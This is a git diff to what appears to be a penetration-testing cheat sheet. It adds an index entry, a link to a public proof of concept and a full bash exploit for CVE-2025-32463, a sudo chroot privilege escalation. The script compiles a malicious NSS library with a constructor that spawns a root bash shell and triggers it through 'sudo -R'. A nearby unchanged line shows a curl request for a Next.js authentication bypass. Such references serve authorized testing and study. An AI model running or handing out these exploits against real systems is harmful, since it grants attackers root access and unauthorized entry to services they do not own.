@@ -176,6 +176,7 @@ Thank you for reading.
    		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
    		- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
    		- [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authenication-bypass)
+   		- [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
   		- [GodPotato LPE](#godpotato-lpe)
 		- [Juicy Potato LPE](#juicy-potato-lpe)
   		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
@@ -447,6 +448,7 @@ Thank you for reading.
 | CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
 | CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
 | CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
+| CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -8240,6 +8242,38 @@ else:
 
 ```shell
 $ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
+```
+
+#### CVE-2025-32463: chwoot sudo LPE
+
+```bash
+#!/bin/bash
+# sudo-chwoot.sh
+# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
+#                  @ Stratascale Cyber Research Unit (CRU)
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd ${STAGE?} || exit 1
+
+cat > woot1337.c<<EOF
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void woot(void) {
+  setreuid(0,0);
+  setregid(0,0);
+  chdir("/");
+  execl("/bin/bash", "/bin/bash", NULL);
+}
+EOF
+
+mkdir -p woot/etc libnss_
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+
+echo "woot!"
+sudo -R woot woot
+rm -rf ${STAGE?}
 ```
 
 #### GodPotato LPE
